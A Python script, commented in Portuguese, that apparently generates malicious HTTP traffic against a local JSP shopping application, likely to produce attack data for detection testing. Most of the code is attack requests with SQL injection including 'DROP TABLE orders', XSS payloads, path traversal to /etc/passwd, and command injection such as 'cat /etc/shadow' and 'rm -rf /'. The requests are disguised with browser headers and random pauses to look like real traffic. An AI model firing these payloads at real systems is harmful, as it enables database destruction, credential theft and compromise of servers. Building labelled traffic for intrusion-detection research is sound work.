import requests
import random
import time
from datetime import datetime, timedelta
import socket

# URL do servidor (substitua pelo endereço do seu servidor)
server_url = ""

# Headers comuns para parecer uma navegação legítima
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
}

# Funções de ataque (maliciosas)
def sql_injection():
    url = f"{server_url}/public/anadir.jsp"
    params = random.choice([
        {"id": "2", "name": "Manchego Cheese", "price": "50", "quantity": "' OR '1'='1", "B1": "Buy"},
        {"id": "3", "name": "Olive Oil", "price": "60", "quantity": "'; DROP TABLE orders; --", "B1": "Add"},
        {"id": "4", "name": "Paella", "price": "30", "quantity": "5 OR 1=1", "B1": "Add to cart"}
    ])
    return requests.get(url, params=params, headers=headers)

def xss_attack():
    url = f"{server_url}/public/authenticate.jsp"
    params = random.choice([
        {"mode": "login", "username": "<script>alert('XSS')</script>", "password": "password123", "remember": "on", "B1": "Login"},
        {"mode": "login", "username": "<img src=x onerror=alert('XSS')>", "password": "securepass", "remember": "on", "B1": "Login"},
        {"mode": "login", "username": "<svg onload=alert('XSS')>", "password": "mypassword", "remember": "off", "B1": "Sign in"}
    ])
    return requests.get(url, params=params, headers=headers)

def directory_traversal():
    url = f"{server_url}/public/features.jsp"
    params = random.choice([
        {"id": "../../etc/passwd"},
        {"id": "../../../boot.ini"},
        {"id": "../../confidential.txt"}
    ])
    return requests.get(url, params=params, headers=headers)

def command_injection():
    url = f"{server_url}/public/register.jsp"
    params = random.choice([
        {"mode": "register", "username": "user1", "password": "pass1", "first_name": "user1", "address": "127.0.0.1; ls -la;", "city": "City", "postal_code": "12345", "state": "TestState", "credit_card": "4111111111111111", "B1": "Register"},
        {"mode": "register", "username": "user2", "password": "pass2", "first_name": "user2", "address": "localhost; cat /etc/shadow;", "city": "Town", "postal_code": "54321", "state": "AnotherState", "credit_card": "4222222222222222", "B1": "Sign Up"},
        {"mode": "register", "username": "user3", "password": "pass3", "first_name": "user3", "address": "192.168.0.1; rm -rf /;", "city": "Village", "postal_code": "67890", "state": "SampleState", "credit_card": "4333333333333333", "B1": "Submit"}
    ])
    return requests.get(url, params=params, headers=headers)

# Função de tráfego legítimo (benigno)
def benign_request():
    """Gera requisições benignas simulando tráfego real no servidor e retorna o objeto requests.get()."""
    benign_endpoints = [
        "/",  # Página inicial
        "/admin",  # Painel administrativo (acesso permitido)
        "/home",  # Página inicial do usuário autenticado
        "/profile",  # Página de perfil do usuário
        "/search?q=produtos",  # Busca no site
        "/contact",  # Página de contato
        "/products",  # Página de listagem de produtos
        "/cart",  # Carrinho de compras
        "/checkout",  # Finalização de compras
    ]

    # Simular diferentes cabeçalhos de aceitação para requisições benignas
    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "application/json, text/plain, */*",
        "image/avif,image/webp,image/apng,image/svg+xml,*/*;q=0.8",
    ]

    # Escolher um endpoint e cabeçalho de forma aleatória
    endpoint = random.choice(benign_endpoints)
    accept_header = random.choice(accept_headers)

    # Construir os parâmetros de cabeçalho e IP
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept": accept_header,
    }

    ip = f"192.168.0.{random.randint(1, 255)}"  # Gerar IPs na rede local
    url = f"{server_url}{endpoint}"

    # Enviar a requisição simulada
    response = requests.get(url, headers=headers)

    # Retornar o objeto requests.get()
    return response


# Lista de funções maliciosas
malicious_requests = [sql_injection, xss_attack, directory_traversal, command_injection]

# Gerar tráfego contínuo
def generate_traffic(duration_minutes=5):
    end_time = datetime.now() + timedelta(minutes=duration_minutes)
    while datetime.now() < end_time:
        try:
            response = random.choice(malicious_requests)()
            print(f"[Malicious] Status: {response.status_code} - URL: {response.url}")
            
            # Pausa entre as solicitações (para parecer tráfego real)
            time.sleep(random.uniform(0.5, 2.0))
        except Exception as e:
            print(f"Erro ao enviar solicitação: {e}")

def get_local_ip():
    try:
        # Cria um socket temporário para determinar o IP local
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # Conecta-se a um endereço público qualquer (não é feita uma conexão real)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]  # Obtém o endereço IP local associado
        return ip_address
    except Exception as e:
        print(f"Erro ao obter o IP local: {e}")
        return None
    
# Executar o gerador de tráfego
if __name__ == "__main__":
    local_ip = get_local_ip()
    if local_ip:
        print(f"IP local da rede: {local_ip}")
    else:
        print("Não foi possível obter o IP local.")
    server_url = f"http://{local_ip}/"  # Atualizar o URL do servidor com o IP local
    duration = 0.5  # Defina a duração em minutos
    print(f"Gerando tráfego por {duration} minutos...")
    generate_traffic(duration_minutes=duration)
    print("Tráfego gerado com sucesso.")
